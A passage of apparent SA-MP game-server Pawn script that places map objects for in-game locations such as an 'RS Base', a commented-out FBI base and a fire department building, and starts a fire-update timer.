CreateObject(1216, 1831.42175, -1840.34180, 13.26040,   0.00000, 0.00000, -90.66000);
CreateObject(19324, 1833.26270, -1830.88818, 13.26040,   0.00000, 0.00000, -88.13999);
CreateObject(19324, 1833.24304, -1831.93445, 13.26040,   0.00000, 0.00000, -88.13999);
CreateObject(19324, 1833.18225, -1832.98511, 13.26040,   0.00000, 0.00000, -88.13999);
CreateObject(19324, 1833.11975, -1834.01599, 13.26040,   0.00000, 0.00000, -88.13999);
CreateObject(3089, 1843.16003, -1853.96680, 13.94480,   0.00000, 0.00000, 90.54000);
CreateObject(2387, 1842.53040, -1858.31287, 12.60000,   0.00000, 0.00000, 89.52002);
CreateObject(2385, 1842.05530, -1855.28394, 12.24000,   0.00000, 0.00000, 271.07990);
CreateObject(2941, 1841.91223, -1855.34631, 13.92290,   0.00000, 0.00000, -87.90000);
CreateObject(19624, 1841.88184, -1856.58167, 13.58510,   0.00000, 0.00000, -89.22000);
CreateObject(19624, 1841.88184, -1855.87512, 13.58510,   0.00000, 0.00000, -89.22000);
CreateObject(2846, 1840.42102, -1859.64453, 12.60000,   0.00000, 0.00000, 0.00000);
CreateObject(2846, 1839.88867, -1859.82800, 12.60000,   0.00000, 0.00000, 0.00000);
CreateObject(2412, 1831.66309, -1856.22864, 12.58010,   0.00000, 0.00000, 88.44000);
CreateObject(2412, 1831.69604, -1854.44678, 12.58010,   0.00000, 0.00000, 88.44000);
CreateObject(19171, 1843.04407, -1855.58948, 14.50000,   -90.00000, -90.50000, 0.00000);
CreateObject(19006, 1841.85303, -1855.99707, 13.67700,   0.00000, 0.00000, -174.00000);
CreateObject(2485, 1841.93713, -1856.55603, 13.67390,   0.00000, 0.00000, 0.00000);
CreateObject(19442, 1833.78748, -1850.33813, 14.33000,   0.00000, 0.00000, -90.00000);
CreateObject(19442, 1831.47852, -1851.06653, 14.33000,   0.00000, 0.00000, 0.00000);
CreateObject(19379, 1836.64587, -1855.15430, 12.51550,   0.00000, 90.00000, 0.00000);
CreateObject(19442, 1841.90710, -1859.91675, 14.33000,   0.00000, 0.00000, 90.00000);
CreateObject(19442, 1843.51306, -1859.91882, 14.33000,   0.00000, 0.00000, 90.00000);
CreateObject(19442, 1843.51306, -1859.91882, 10.89400,   0.00000, 0.00000, 90.00000);
CreateObject(19442, 1841.92712, -1859.91553, 10.89400,   0.00000, 0.00000, 90.00000);
CreateObject(19415, 1839.49915, -1859.91882, 10.89400,   0.00000, 0.00000, 90.00000);
CreateObject(19442, 1837.10962, -1859.91882, 10.89400,   0.00000, 0.00000, 90.00000);
CreateObject(19415, 1834.73059, -1859.91882, 10.89400,   0.00000, 0.00000, 90.00000);
CreateObject(19442, 1832.32019, -1859.91882, 10.89400,   0.00000, 0.00000, 90.00000);

//
// RS Base

CreateDynamicObject(3851, 1220.10278, -1649.16248, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1224.04810, -1649.13965, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1227.97302, -1649.13489, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1231.96069, -1649.09338, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1235.88623, -1649.06897, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1239.82935, -1649.08545, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1243.77686, -1649.07141, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1247.72058, -1649.09766, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1251.66858, -1649.10583, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1255.66052, -1649.09290, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1259.62317, -1649.10388, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1263.56665, -1649.11597, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1267.50940, -1649.12915, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1220.11072, -1660.46521, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1220.08923, -1671.76636, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1224.07886, -1660.40979, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1227.98572, -1660.41772, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1231.94189, -1660.35950, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1235.91150, -1660.36365, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1239.83813, -1660.34253, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1243.78259, -1660.28174, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1247.74719, -1660.32813, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1251.71570, -1660.33337, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1255.65552, -1660.37732, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1259.65503, -1660.40173, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1263.61682, -1660.40332, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1267.57849, -1660.41858, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1224.05286, -1671.70337, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1228.01819, -1671.73303, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1231.95728, -1671.66382, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1235.91772, -1671.66443, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1239.85889, -1671.65808, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1243.84229, -1671.58044, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1247.79895, -1671.55603, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1251.73389, -1671.58936, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1255.65503, -1671.62549, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1259.61426, -1671.66516, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1263.53503, -1671.65393, 27.47067,   0.00000, 90.00001, 0.00000);
CreateDynamicObject(3851, 1267.45544, -1671.66516, 27.47067,   0.00000, 90.00001, 0.00000);



CreateDynamicObject(11353, 1516.40100, -1675.87341, 16.95279,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(10932, 1535.87524, -1675.96753, 19.77636,   0.00000, 0.00000, 180.11998);
/*
//FBI BASE Neu
CreateDynamicObject(8652, 1498.80, -1742.55, 13.37, 0.00, 0.00, 180.00);
CreateDynamicObject(7033, 1471.11, -1749.13, 16.83, 0.00, 0.00, 0.00);
CreateDynamicObject(6959, 1470.07, -1757.97, 12.55, 0.00, 0.00, 0.00);
CreateDynamicObject(8652, 1528.36, -1742.55, 13.37, 0.00, 0.00, 180.00);
CreateDynamicObject(6959, 1470.07, -1757.97, 12.55, 0.00, 0.00, 0.00);
CreateDynamicObject(6959, 1461.09, -1762.32, 12.57, 0.00, 0.00, 0.00);
CreateDynamicObject(8652, 1399.32, -1757.39, 13.37, 0.00, 0.00, 90.00);
CreateDynamicObject(8652, 1399.32, -1787.03, 13.37, 0.00, 0.00, 90.00);
CreateDynamicObject(8652, 1399.34, -1810.06, 13.35, 0.00, 0.00, 90.00);
CreateDynamicObject(8652, 1414.36, -1824.56, 13.35, 0.00, 0.00, 180.00);
CreateDynamicObject(973, 1458.81, -1749.01, 13.34, 0.00, 0.00, -90.00);
CreateDynamicObject(973, 1483.47, -1749.01, 13.34, 0.00, 0.00, 90.00);
CreateDynamicObject(966, 1474.48, -1742.54, 12.53, 0.00, 0.00, 180.00);
CreateDynamicObject(966, 1467.88, -1742.54, 12.53, 0.00, 0.00, 0.00);
CreateDynamicObject(8843, 1477.99, -1751.34, 12.56, 0.00, 0.00, 0.00);
CreateDynamicObject(8843, 1464.24, -1751.21, 12.56, 0.00, 0.00, 180.00);
CreateDynamicObject(8652, 1425.41, -1757.38, 13.37, 0.00, 0.00, 90.00);
CreateDynamicObject(2909, 1420.89, -1742.61, 11.22, 0.00, 0.00, 90.00);
CreateDynamicObject(2909, 1420.89, -1747.61, 11.22, 0.00, 0.00, 90.00);
CreateDynamicObject(2909, 1420.89, -1752.61, 11.22, 0.00, 0.00, 90.00);
CreateDynamicObject(2909, 1420.89, -1757.61, 11.22, 0.00, 0.00, 90.00);
CreateDynamicObject(2909, 1420.89, -1767.61, 11.22, 0.00, 0.00, 90.00);
CreateDynamicObject(2909, 1420.89, -1762.61, 11.22, 0.00, 0.00, 90.00);
CreateDynamicObject(2909, 1420.89, -1772.15, 11.22, 0.00, 0.00, 90.00);
CreateDynamicObject(2909, 1429.71, -1747.61, 11.22, 0.00, 0.00, 90.00);
CreateDynamicObject(2909, 1429.71, -1742.61, 11.22, 0.00, 0.00, 90.00);
CreateDynamicObject(2909, 1429.71, -1752.61, 11.22, 0.00, 0.00, 90.00);
CreateDynamicObject(2909, 1429.71, -1757.61, 11.22, 0.00, 0.00, 90.00);
CreateDynamicObject(2909, 1429.71, -1762.61, 11.22, 0.00, 0.00, 90.00);
CreateDynamicObject(2909, 1429.71, -1767.61, 11.22, 0.00, 0.00, 90.00);
CreateDynamicObject(2909, 1429.71, -1772.15, 11.22, 0.00, 0.00, 90.00);
CreateDynamicObject(2909, 1515.11, -1742.95, 11.22, 0.00, 0.00, 90.00);
CreateDynamicObject(2909, 1515.11, -1747.95, 11.22, 0.00, 0.00, 90.00);
CreateDynamicObject(2909, 1515.11, -1752.95, 11.22, 0.00, 0.00, 90.00);
CreateDynamicObject(2909, 1515.11, -1757.95, 11.22, 0.00, 0.00, 90.00);
CreateDynamicObject(2909, 1515.11, -1762.95, 11.22, 0.00, 0.00, 90.00);
CreateDynamicObject(2909, 1515.11, -1767.95, 11.22, 0.00, 0.00, 90.00);
CreateDynamicObject(2909, 1515.11, -1772.95, 11.22, 0.00, 0.00, 90.00);
CreateDynamicObject(2909, 1515.11, -1777.95, 11.22, 0.00, 0.00, 90.00);
CreateDynamicObject(2909, 1515.11, -1782.95, 11.22, 0.00, 0.00, 90.00);
CreateDynamicObject(6965, 1470.16, -1784.04, 15.97, 0.00, 0.00, 0.00);
CreateDynamicObject(6964, 1470.13, -1784.00, 11.86, 0.00, 0.00, 0.00);
CreateDynamicObject(3515, 1455.41, -1783.76, 13.39, 0.00, 0.00, 0.00);
CreateDynamicObject(3515, 1484.85, -1783.76, 13.39, 0.00, 0.00, 0.00);
CreateDynamicObject(7952, 1471.78, -1803.92, 13.23, 0.00, 0.00, 90.00);
CreateDynamicObject(729, 1504.33, -1803.97, 13.76, 0.00, 0.00, 0.00);
CreateDynamicObject(729, 1480.06, -1803.78, 13.76, 0.00, 0.00, 0.00);
CreateDynamicObject(729, 1459.85, -1803.72, 13.76, 0.00, 0.00, 0.00);
CreateDynamicObject(729, 1442.95, -1803.70, 13.76, 0.00, 0.00, 0.00);
CreateDynamicObject(1231, 1519.59, -1784.92, 18.65, 0.00, 0.00, 0.00);
CreateDynamicObject(1231, 1519.58, -1742.64, 18.65, 0.00, 0.00, 0.00);
CreateDynamicObject(1231, 1555.66, -1742.60, 18.65, 0.00, 0.00, 0.00);
CreateDynamicObject(1231, 1555.70, -1784.83, 18.65, 0.00, 0.00, 0.00);
CreateDynamicObject(1231, 1552.38, -1799.79, 17.89, 0.00, 0.00, 0.00);
CreateDynamicObject(1231, 1547.36, -1807.73, 17.89, 0.00, 0.00, 0.00);
CreateDynamicObject(1231, 1547.37, -1793.82, 17.89, 0.00, 0.00, 0.00);
CreateDynamicObject(1231, 1511.86, -1804.13, 15.07, 0.00, 0.00, 0.00);
CreateDynamicObject(1231, 1492.49, -1803.94, 15.07, 0.00, 0.00, 0.00);
CreateDynamicObject(1231, 1469.98, -1803.96, 15.07, 0.00, 0.00, 0.00);
CreateDynamicObject(1231, 1448.53, -1803.86, 15.07, 0.00, 0.00, 0.00);
CreateDynamicObject(1231, 1425.47, -1772.42, 15.07, 0.00, 0.00, 0.00);
CreateDynamicObject(1231, 1458.84, -1759.20, 15.07, 0.00, 0.00, 0.00);
CreateDynamicObject(1231, 1471.04, -1759.29, 15.07, 0.00, 0.00, 0.00);
CreateDynamicObject(1231, 1483.24, -1759.21, 15.07, 0.00, 0.00, 0.00);
CreateDynamicObject(9833, 1407.79, -1801.14, 15.42, 0.00, 0.00, 0.00);
CreateDynamicObject(968, 1474.28, -1742.53, 13.41, 0.00, 89.50, 0.00);
CreateDynamicObject(968, 1468.09, -1742.53, 13.35, 0.00, -90.50, 0.00);
CreateDynamicObject(10398, 1486.63, -1831.33, 40.76, 0.00, 0.00, 0.00);
CreateDynamicObject(6959, 1419.75, -1842.32, 12.57, 0.00, 0.00, 0.00);
CreateDynamicObject(6959, 1461.09, -1842.32, 12.57, 0.00, 0.00, 0.00);
CreateDynamicObject(6959, 1502.43, -1842.32, 12.57, 0.00, 0.00, 0.00);
CreateDynamicObject(6959, 1543.77, -1842.32, 12.57, 0.00, 0.00, 0.00);
CreateDynamicObject(6959, 1419.75, -1802.32, 12.57, 0.00, 0.00, 0.00);
CreateDynamicObject(6959, 1419.75, -1762.32, 12.57, 0.00, 0.00, 0.00);
CreateDynamicObject(6959, 1511.39, -1757.87, 12.55, 0.00, 0.00, 0.00);
CreateDynamicObject(6959, 1502.43, -1762.32, 12.57, 0.00, 0.00, 0.00);
CreateDynamicObject(6959, 1543.77, -1762.32, 12.57, 0.00, 0.00, 0.00);
CreateDynamicObject(6959, 1543.77, -1802.32, 12.57, 0.00, 0.00, 0.00);
CreateDynamicObject(6959, 1502.43, -1802.32, 12.57, 0.00, 0.00, 0.00);
CreateDynamicObject(6959, 1461.09, -1802.32, 12.57, 0.00, 0.00, 0.00);
CreateDynamicObject(4874, 1539.46, -1781.08, 15.90, 0.00, 0.00, -90.00);
CreateDynamicObject(2909, 1543.05, -1785.27, 11.22, 0.00, 0.00, 90.00);
CreateDynamicObject(2909, 1543.05, -1790.27, 11.22, 0.00, 0.00, 90.00);
CreateDynamicObject(2909, 1543.05, -1795.27, 11.22, 0.00, 0.00, 90.00);
CreateDynamicObject(2909, 1543.01, 1805.67, 11.22, 0.00, 0.00, 90.00);
CreateDynamicObject(2909, 1543.05, -1800.27, 11.22, 0.00, 0.00, 90.00);
CreateDynamicObject(2909, 1543.05, -1805.27, 11.22, 0.00, 0.00, 90.00);
CreateDynamicObject(2909, 1543.05, -1810.27, 11.22, 0.00, 0.00, 90.00);
CreateDynamicObject(8652, 1413.82, -1742.37, 13.37, 0.00, 0.00, 0.00);
CreateDynamicObject(8652, 1443.42, -1742.37, 13.37, 0.00, 0.00, 0.00);
//
*/
CreateDynamicObject(14385,2511.64404297,-1725.43725586,779.20867920,0.00000000,0.00000000,0.00000000); //object(kb_tr_main) (1)
CreateDynamicObject(14386,2511.68481445,-1726.33496094,779.07116699,0.00000000,0.00000000,0.00000000); //object(kb_tr_bits) (1)
CreateDynamicObject(6959,2509.99047852,-1725.06567383,777.64141846,0.00000000,0.00000000,0.00000000); //object(vegasnbball1) (1)
CreateDynamicObject(5856,2509.53320312,-1731.39013672,779.61633301,0.00000000,0.00000000,0.00000000); //object(lawnspraydoor1) (1)
CreateDynamicObject(5856,2509.32836914,-1728.60351562,779.61633301,0.00000000,0.00000000,0.00000000); //object(lawnspraydoor1) (2)
CreateDynamicObject(5856,2509.53295898,-1726.11254883,779.61633301,0.00000000,0.00000000,0.00000000); //object(lawnspraydoor1) (4)
CreateDynamicObject(5856,2509.51269531,-1722.17846680,779.61633301,0.00000000,0.00000000,0.00000000); //object(lawnspraydoor1) (5)
CreateDynamicObject(5856,2508.47363281,-1723.26416016,779.61633301,0.00000000,0.00000000,90.00000000); //object(lawnspraydoor1) (6)
CreateDynamicObject(5856,2511.74902344,-1732.35571289,779.64135742,0.00000000,0.00000000,90.00000000); //object(lawnspraydoor1) (7)
CreateDynamicObject(5856,2512.50463867,-1718.44873047,779.61633301,0.00000000,0.00000000,90.00000000); //object(lawnspraydoor1) (8)
CreateDynamicObject(5856,2508.47216797,-1720.57666016,779.61633301,0.00000000,0.00000000,90.00000000); //object(lawnspraydoor1) (9)
CreateDynamicObject(5856,2510.49926758,-1718.53540039,779.61633301,0.00000000,0.00000000,0.00000000); //object(lawnspraydoor1) (10)
CreateDynamicObject(5856,2513.87133789,-1722.26379395,779.61633301,0.00000000,0.00000000,0.00000000); //object(lawnspraydoor1) (11)
CreateDynamicObject(5856,2513.82446289,-1718.46496582,779.61633301,0.00000000,0.00000000,0.00000000); //object(lawnspraydoor1) (12)
CreateDynamicObject(5856,2513.87915039,-1726.26562500,779.61633301,0.00000000,0.00000000,0.00000000); //object(lawnspraydoor1) (13)
CreateDynamicObject(5856,2513.85913086,-1732.00610352,779.61633301,0.00000000,0.00000000,0.00000000); //object(lawnspraydoor1) (14)
CreateDynamicObject(1506,2513.85717773,-1728.38867188,777.63519287,0.00000000,0.00000000,270.27026367); //object(gen_doorext08) (1)
CreateDynamicObject(1506,2513.91235352,-1728.40820312,779.47076416,0.00000000,0.00000000,270.26916504); //object(gen_doorext08) (3)
CreateDynamicObject(970,2511.74829102,-1732.07653809,778.16162109,90.00000000,180.00000000,0.00000000); //object(fencesmallb) (1)
CreateDynamicObject(970,2509.78393555,-1732.34350586,778.18853760,90.00000000,168.46301270,281.53701782); //object(fencesmallb) (2)
CreateDynamicObject(970,2513.58300781,-1732.32409668,778.08843994,90.00000000,165.52246094,104.47750854); //object(fencesmallb) (3)
CreateDynamicObject(970,2513.57885742,-1725.89221191,778.06341553,90.00000000,191.09693909,78.89749146); //object(fencesmallb) (4)
CreateDynamicObject(970,2513.87695312,-1726.11376953,778.08276367,90.00000000,179.99450684,0.00000000); //object(fencesmallb) (5)
CreateDynamicObject(970,2509.60205078,-1728.10534668,778.76397705,90.00000000,173.27777100,276.71679688); //object(fencesmallb) (6)
CreateDynamicObject(1271,2510.17895508,-1723.83093262,778.13720703,0.00000000,0.00000000,0.00000000); //object(gunbox) (2)
CreateDynamicObject(1271,2510.17724609,-1725.78588867,778.33740234,0.00000000,0.00000000,0.00000000); //object(gunbox) (3)
CreateDynamicObject(1271,2510.12817383,-1724.27319336,777.98706055,0.00000000,0.00000000,0.00000000); //object(gunbox) (4)
CreateDynamicObject(970,2508.42675781,-1724.93640137,778.63781738,90.00000000,179.99450684,0.00000000); //object(fencesmallb) (8)
CreateDynamicObject(970,2508.71679688,-1726.80578613,778.18853760,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (9)
CreateDynamicObject(970,2508.71166992,-1726.37329102,778.18853760,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (10)
CreateDynamicObject(970,2513.85937500,-1725.26684570,778.61395264,90.00000000,179.99450684,0.00000000); //object(fencesmallb) (11)
CreateDynamicObject(970,2513.40307617,-1723.74865723,778.63897705,90.00000000,180.00000000,90.00000000); //object(fencesmallb) (12)
CreateDynamicObject(970,2513.82714844,-1725.81848145,778.18853760,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (13)
CreateDynamicObject(1271,2509.66943359,-1727.24377441,779.76306152,0.00000000,0.00000000,0.00000000); //object(gunbox) (7)
CreateDynamicObject(2238,2509.91040039,-1729.96411133,779.80548096,0.00000000,0.00000000,0.00000000); //object(cj_lava_lamp) (1)
CreateDynamicObject(2238,2510.36132812,-1726.61914062,778.60479736,90.00000000,0.00000000,90.00000000); //object(cj_lava_lamp) (2)
CreateDynamicObject(970,2511.14306641,-1720.63073730,778.78912354,0.00000000,90.00000000,0.00000000); //object(fencesmallb) (15)
CreateDynamicObject(970,2513.45117188,-1720.59960938,778.73907471,0.00000000,90.00000000,0.00000000); //object(fencesmallb) (16)
CreateDynamicObject(970,2512.92065430,-1720.62817383,780.88885498,0.00000000,0.00000000,0.00000000); //object(fencesmallb) (17)
CreateDynamicObject(970,2510.53930664,-1721.07861328,778.18853760,0.00000000,90.00000000,269.99996948); //object(fencesmallb) (18)
CreateDynamicObject(970,2510.78442383,-1719.45983887,777.96331787,90.00000000,180.00549316,180.00000000); //object(fencesmallb) (19)
CreateDynamicObject(970,2510.71191406,-1718.86914062,778.06152344,90.00000000,179.99450684,0.00000000); //object(fencesmallb) (20)
CreateDynamicObject(2238,2513.51245117,-1724.43383789,779.59893799,0.00000000,0.00000000,0.00000000); //object(cj_lava_lamp) (3)
CreateDynamicObject(2238,2513.54003906,-1723.88220215,779.57098389,0.00000000,0.00000000,0.00000000); //object(cj_lava_lamp) (4)
CreateDynamicObject(2238,2513.49609375,-1722.42236328,779.68225098,0.00000000,0.00000000,0.00000000); //object(cj_lava_lamp) (5)
CreateDynamicObject(2238,2513.49609375,-1721.91296387,779.62988281,0.00000000,0.00000000,0.00000000); //object(cj_lava_lamp) (6)
CreateDynamicObject(2238,2513.51782227,-1723.09289551,779.81280518,0.00000000,90.00000000,89.99993896); //object(cj_lava_lamp) (7)
CreateDynamicObject(2238,2512.33911133,-1725.89257812,779.84576416,0.00000000,90.00000000,0.00000000); //object(cj_lava_lamp) (8)
CreateDynamicObject(2238,2513.22021484,-1725.83862305,779.86608887,0.00000000,90.00000000,0.00000000); //object(cj_lava_lamp) (9)
CreateDynamicObject(2238,2510.31909180,-1726.63354492,778.82574463,0.00000000,0.00000000,0.00000000); //object(cj_lava_lamp) (10)
CreateDynamicObject(5856,2509.52270508,-1728.52905273,782.33337402,0.00000000,0.00000000,0.00000000); //object(lawnspraydoor1) (15)
CreateDynamicObject(5856,2511.66455078,-1731.28613281,780.86901855,0.00000000,90.00000000,89.99993896); //object(lawnspraydoor1) (16)
CreateDynamicObject(1749,2509.79565430,-1725.85131836,778.65332031,0.00000000,0.00000000,89.73004150); //object(med_tv_3) (1)
CreateDynamicObject(5856,2511.68237305,-1727.16394043,780.86901855,0.00000000,90.00000000,89.99993896); //object(lawnspraydoor1) (17)
CreateDynamicObject(5856,2511.66943359,-1723.12780762,780.86901855,0.00000000,90.00000000,89.99987793); //object(lawnspraydoor1) (18)
CreateDynamicObject(5856,2511.67895508,-1719.76562500,780.86901855,0.00000000,90.00000000,90.00000000); //object(lawnspraydoor1) (19)
CreateDynamicObject(970,2510.54785156,-1721.16503906,780.80316162,0.00000000,0.00000000,90.00000000); //object(fencesmallb) (22)
CreateDynamicObject(3461,2510.54174805,-1722.73986816,779.88775635,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (1)
CreateDynamicObject(3461,2510.53662109,-1723.15808105,779.91278076,0.00000000,0.00000000,0.00000000); //object(tikitorch01_lvs) (2)



	SetTimer("OnFireUpdate",1136,1);




    //San Andreas Fire Department mapped by Fernandez_
	CreateDynamicObject(9339,1790.79,-1138.60,23.48, 0.00,0.00,0.00);
	CreateDynamicObject(9339,1790.79,-1138.60,24.88, 0.00,0.00,0.00);
	CreateDynamicObject(9339,1790.79,-1138.60,26.28, 0.00,0.00,0.00);
	CreateDynamicObject(9339,1790.79,-1136.60,27.68, 0.00,0.00,0.00);
	CreateDynamicObject(9339,1790.79,-1129.06,29.08, 0.00,0.00,0.00);
	CreateDynamicObject(9339,1703.04,-1127.50,23.60, 0.00,0.00,0.00);
	CreateDynamicObject(9339,1703.04,-1127.50,25.00, 0.00,0.00,0.00);
	CreateDynamicObject(9339,1703.04,-1127.50,26.40, 0.00,0.00,0.00);
	CreateDynamicObject(9339,1703.04,-1127.50,27.80, 0.00,0.00,0.00);
	CreateDynamicObject(9339,1703.04,-1127.50,29.20, 0.00,0.00,0.00);
	CreateDynamicObject(9339,1703.04,-1108.20,23.60, 0.00,0.00,0.00);
	CreateDynamicObject(9339,1703.04,-1108.20,25.00, 0.00,0.00,0.00);
	CreateDynamicObject(9339,1703.04,-1108.20,26.40, 0.00,0.00,0.00);
	CreateDynamicObject(9339,1703.04,-1108.20,27.80, 0.00,0.00,0.00);
	CreateDynamicObject(9339,1703.04,-1108.20,29.20, 0.00,0.00,0.00);
	CreateDynamicObject(9339,1716.70,-1142.38,28.60, 0.00,0.00,90.00);
	CreateDynamicObject(9339,1716.70,-1142.38,27.80, 180.00,0.00,90.00);
	CreateDynamicObject(9339,1718.20,-1142.38,14.10, 90.00,180.00,90.00);
	CreateDynamicObject(9339,1706.80,-1142.40,14.10, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1712.35,-1142.38,14.10, 90.00,180.00,90.00);
	CreateDynamicObject(9339,1712.60,-1142.38,14.10, 90.00,0.00,90.00);
	CreateDynamicObject(1649,1705.20,-1142.50,25.00, 0.00,90.00,0.00);
	CreateDynamicObject(1649,1705.60,-1142.30,25.00, 0.00,90.00,180.00);
	CreateDynamicObject(1649,1719.40,-1142.40,25.00, 0.00,90.00,0.00);
	CreateDynamicObject(1649,1719.30,-1142.30,25.00, 0.00,90.00,180.00);
	CreateDynamicObject(9339,1742.60,-1142.38,28.60, 0.00,0.00,90.00);
	CreateDynamicObject(9339,1769.10,-1142.38,28.60, 0.00,0.00,90.00);
	CreateDynamicObject(9339,1794.60,-1142.38,28.60, 0.00,0.00,90.00);
	CreateDynamicObject(9339,1742.60,-1142.38,27.80, 180.00,0.00,90.00);
	CreateDynamicObject(9339,1768.50,-1142.38,27.80, 180.00,0.00,90.00);
	CreateDynamicObject(9339,1794.00,-1142.38,27.80, 0.00,180.00,90.00);
	CreateDynamicObject(9339,1717.40,-1094.90,28.60, 0.00,0.00,90.00);
	CreateDynamicObject(9339,1743.10,-1094.90,28.60, 0.00,0.00,90.00);
	CreateDynamicObject(9339,1768.90,-1094.90,28.60, 0.00,0.00,90.00);
	CreateDynamicObject(9339,1793.30,-1094.90,28.60, 0.00,0.00,90.00);
	CreateDynamicObject(9339,1717.40,-1094.90,27.80, 180.00,0.00,90.00);
	CreateDynamicObject(9339,1743.20,-1094.90,27.80, 180.00,0.00,90.00);
	CreateDynamicObject(9339,1769.20,-1094.90,27.80, 180.00,0.00,90.00);
	CreateDynamicObject(9339,1792.60,-1094.90,27.80, 179.99,0.00,90.00);
	CreateDynamicObject(9339,1723.90,-1142.38,14.10, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1735.30,-1142.38,14.10, 90.00,180.00,90.00);
	CreateDynamicObject(9339,1752.50,-1142.38,14.10, 90.00,180.00,90.00);
	CreateDynamicObject(9339,1741.20,-1142.38,14.10, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1775.30,-1142.38,14.10, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1780.90,-1142.38,14.10, 90.00,180.00,90.00);
	CreateDynamicObject(9339,1782.90,-1142.38,14.10, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1784.90,-1142.38,14.10, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1787.00,-1142.38,14.10, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1782.90,-1142.38,14.10, 90.00,180.00,90.00);
	CreateDynamicObject(9339,1784.90,-1142.38,14.10, 90.00,180.00,90.00);
	CreateDynamicObject(9339,1786.90,-1142.38,14.10, 90.00,180.00,90.00);
	CreateDynamicObject(9339,1729.70,-1142.38,14.10, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1729.50,-1142.38,14.10, 90.00,180.00,90.00);
	CreateDynamicObject(9339,1746.90,-1142.30,14.10, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1746.80,-1142.30,14.10, 90.00,180.00,90.00);
	CreateDynamicObject(9339,1758.10,-1094.90,14.10, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1769.50,-1094.90,14.10, 90.00,180.00,90.00);
	CreateDynamicObject(9339,1740.90,-1094.90,14.10, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1752.50,-1094.90,14.10, 90.00,180.00,90.00);
	CreateDynamicObject(9339,1723.80,-1094.90,14.10, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1735.40,-1094.90,14.10, 90.00,180.00,90.00);
	CreateDynamicObject(9339,1770.00,-1094.90,14.10, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1757.60,-1094.90,14.10, 90.00,179.99,90.00);
	CreateDynamicObject(9339,1753.00,-1094.90,14.10, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1740.40,-1094.90,14.10, 90.00,180.00,90.00);
	CreateDynamicObject(9339,1735.90,-1094.90,14.10, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1723.30,-1094.90,14.10, 90.00,180.00,90.00);
	CreateDynamicObject(9339,1718.70,-1142.38,14.10, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1706.30,-1142.38,14.10, 90.00,180.00,90.00);
	CreateDynamicObject(9339,1735.80,-1142.38,14.10, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1723.40,-1142.38,14.10, 90.00,180.00,90.00);
	CreateDynamicObject(9339,1753.00,-1142.38,14.10, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1740.70,-1142.38,14.10, 90.00,180.00,90.00);
	CreateDynamicObject(9339,1774.80,-1142.38,14.10, 90.00,180.00,90.00);
	CreateDynamicObject(9339,1780.90,-1142.38,14.10, 90.00,0.00,90.00);
	CreateDynamicObject(9339,1706.90,-1094.90,14.10, 90.00,0.00,90.00);
